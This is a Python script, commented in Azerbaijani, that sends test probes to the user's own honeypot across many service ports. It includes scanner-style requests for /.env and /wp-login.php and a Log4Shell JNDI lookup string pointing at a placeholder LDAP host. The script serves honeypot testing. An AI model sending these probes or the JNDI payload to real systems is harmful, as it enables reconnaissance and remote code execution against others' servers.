#!/usr/bin/env python3
"""Öz honeypot-unuza sınaq trafiki göndərir (hər kateqoriyadan nümunə). Yalnız öz honeypot-unuza istifadə edin!

Fərqli regionlardakı öz VM-lərinizdən işlədib xəritədə fərqli mənbələr görə bilərsiniz:
    python3 sim_client.py --host HONEYPOT_IP
    python3 sim_client.py --host 127.0.0.1 --offset 10000 --rounds 3      # lokal sınaq
"""
import argparse
import socket
import time

PROBES = [
    (21, b"USER admin\r\n"), (22, b"SSH-2.0-libssh_0.9.6\r\n"), (23, b"admin\r\n"), (25, b"EHLO scanner\r\n"),
    (80, b"GET /.env HTTP/1.1\r\nHost: x\r\n\r\n"), (80, b"GET /wp-login.php HTTP/1.1\r\nHost: x\r\n\r\n"),
    (8080, b"GET /?x=${jndi:ldap://203.0.113.9/a} HTTP/1.1\r\nHost: x\r\n\r\n"),
    (110, b"USER test\r\n"), (139, b""), (443, b"\x16\x03\x01\x02\x00\x01\x00"), (445, b"\x00\x00\x00\x85\xffSMBr"),
    (1433, b"\x12\x01\x00\x34"), (3306, b""), (3389, b"\x03\x00\x00\x13\x0e\xe0Cookie: mstshash=admin\r\n"),
    (5900, b"RFB 003.008\n"), (6379, b"INFO\r\n"),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--delay", type=float, default=0.3)
    a = ap.parse_args()
    for r in range(a.rounds):
        for port, data in PROBES:
            try:
                with socket.create_connection((a.host, port + a.offset), timeout=3) as s:
                    s.settimeout(1.5)
                    try:
                        s.recv(256)
                    except OSError:
                        pass
                    if data:
                        s.sendall(data)
                        try:
                            s.recv(256)
                        except OSError:
                            pass
                print(f"{port:>5}  ok")
            except OSError as e:
                print(f"{port:>5}  xəta: {e}")
            time.sleep(a.delay)


if __name__ == "__main__":
    main()
